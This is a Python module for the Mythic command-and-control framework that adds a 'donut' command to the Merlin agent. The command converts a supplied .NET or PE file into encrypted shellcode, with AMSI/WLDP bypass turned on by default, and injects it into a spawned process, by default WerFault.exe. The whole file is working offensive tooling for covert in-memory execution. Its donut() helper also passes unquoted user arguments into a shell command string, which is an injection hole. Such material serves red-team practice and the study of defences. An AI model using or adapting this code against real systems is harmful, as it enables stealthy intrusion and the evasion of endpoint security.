
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicResponseRPC import *
import os
import json
import subprocess

# Set to enable debug output to Mythic
debug = False


class DonutArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "module": CommandParameter(
                name="module",
                type=ParameterType.String,
                description="Module name. Randomly generated by default with entropy enabled",
                required=False,
            ),
            "url": CommandParameter(
                name="url",
                type=ParameterType.String,
                description="HTTP server that will host the donut module",
                required=False,
            ),
            "entropy": CommandParameter(
                name="entropy",
                type=ParameterType.ChooseOne,
                choices=["1", "2", "3"],
                description="1=disable, 2=use random names, 3=random names + symmetric encryption (default)",
                default_value="3",
                required=True,
            ),
            "arch": CommandParameter(
                name="arch",
                type=ParameterType.ChooseOne,
                description="Target Architecture: x32, x64, or x84",
                choices=["x84", "x32", "x64", ],
                default_value="x84",
                required=False,
            ),
            "bypass": CommandParameter(
                name="bypass",
                description="Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail",
                type=ParameterType.ChooseOne,
                choices=["3", "2", "1"],
                default_value="3",
                required=False,
            ),
            "entrypoint": CommandParameter(
                name="entrypoint",
                description="Create a new thread for loader. Optionally execute original entrypoint of host process",
                type=ParameterType.Boolean,
                required=False,
                value=False,
                default_value=False,
            ),
            "exit": CommandParameter(
                name="exit",
                description="Exiting. 1=exit thread, 2=exit process",
                type=ParameterType.ChooseOne,
                choices=["2", "1"],
                required=False,
            ),
            "class": CommandParameter(
                name="class",
                description="Optional class name.  (required for .NET DLL)",
                type=ParameterType.String,
                required=False,
            ),
            "domain": CommandParameter(
                name="domain",
                description="AppDomain name to create for .NET.  Randomly generated by default with entropy enabled",
                type=ParameterType.String,
                required=False,
            ),
            "method": CommandParameter(
                name="method",
                description="Optional method or API name for DLL. (a method is required for .NET DLL)",
                type=ParameterType.String,
                required=False,
            ),
            "input": CommandParameter(
                name="input file",
                type=ParameterType.File,
                description=".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory",
                required=True,
            ),
            "params": CommandParameter(
                name="parameters",
                type=ParameterType.String,
                description="Optional parameters/command line inside quotations for DLL method/function or EXE.",
                required=False,
            ),
            "unicode": CommandParameter(
                name="unicode",
                type=ParameterType.Boolean,
                description="Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)",
                required=False,
                value=False,
                default_value=False,
            ),
            "runtime": CommandParameter(
                name="runtime",
                type=ParameterType.String,
                description="CLR runtime version. This will override the auto-detected version",
                required=False,
            ),
            "thread": CommandParameter(
                name="thread",
                description="Create new thread for entrypoint of unmanaged EXE",
                type=ParameterType.Boolean,
                required=False,
                value=False,
                default_value=False,
            ),
            "compress": CommandParameter(
                name="compress",
                description="Pack/Compress file. 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman",
                type=ParameterType.ChooseOne,
                choices=["1", "2", "3", "4"],
                required=False,
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process to inject and execute the donut generated shellcode",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                required=True,
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Arguments to create the spawnto process with, if any",
                required=False,
            ),
            "verbose": CommandParameter(
                name="verbose",
                description="Show verbose output from Donut",
                type=ParameterType.Boolean,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                pass


class DonutCommand(CommandBase):
    cmd = "donut"
    needs_admin = False
    help_cmd = "donut"
    description = "Convert a VBS/JS or PE/.NET EXE/DLL to shellcode.\n\t\tOnly the finest artisanal donuts are made" \
                  " of shells.\r\nUses the go-donut project at https://github.com/Binject/go-donut"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@Ne0nd0g"
    argument_class = DonutArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Starting create_tasking()')

        donut_args = {"module": task.args.get_arg("module")}
        donut_args["url"] = task.args.get_arg("url")
        donut_args["entropy"] = task.args.get_arg("entropy")
        donut_args["arch"] = task.args.get_arg("arch")
        donut_args["bypass"] = task.args.get_arg("bypass")
        donut_args["oep"] = task.args.get_arg("entrypoint")
        donut_args["exit"] = task.args.get_arg("exit")
        donut_args["class"] = task.args.get_arg("class")
        donut_args["domain"] = task.args.get_arg("domain")
        donut_args["method"] = task.args.get_arg("method")
        donut_args["params"] = task.args.get_arg("params")
        donut_args["unicode"] = task.args.get_arg("unicode")
        donut_args["runtime"] = task.args.get_arg("runtime")
        donut_args["thread"] = task.args.get_arg("thread")
        donut_args["compress"] = task.args.get_arg("compress")
        donut_args["entrypoint"] = task.args.get_arg("entrypoint")
        donut_args["verbose"] = task.args.get_arg("verbose")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Calling donut()')
        donut_results = donut(task.args.get_arg("input"), donut_args)

        if task.args.get_arg("verbose"):
            await MythicResponseRPC(task).user_output(f'[DONUT]Donut verbose output:\r\n{donut_results[1]}\r\n')

        # Merlin jobs.MODULE
        task.args.add_arg("type", 16, ParameterType.Number)

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [donut_results[0], task.args.get_arg("spawnto"), task.args.get_arg("spawntoargs")]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.display_params = f'{json.loads(task.original_params)["input"]} {task.args.get_arg("params")}\n ' \
                              f'spawnto: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("input")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")
        for arg, value in donut_args.items():
            task.args.remove_arg(arg)

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Returned task:\r\n{task}\r\n')
        return task

    async def process_response(self, response: AgentResponse):
        pass


def donut(assembly, arguments):

    donut_args = ['go-donut', '--in', 'input.exe']

    for arg, value in arguments.items():
        if value:
            if arg.lower() in ["verbose", "thread", "unicode"]:
                donut_args.append("--"+arg)
            else:
                donut_args.append("--" + arg)
                donut_args.append(value)

    # Write file to location in container
    with open('input.exe', 'wb') as w:
        w.write(assembly)

    result = subprocess.getoutput(" ".join(donut_args))

    donut_bytes = bytes
    # Read Donut output
    with open('loader.bin', 'rb') as output:
        donut_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("input.exe")
    os.remove("loader.bin")

    # Return Donut shellcode Base64 encoded
    return [base64.b64encode(donut_bytes).decode("utf-8"), f'Commandline: {" ".join(donut_args)}\r\n' + result]
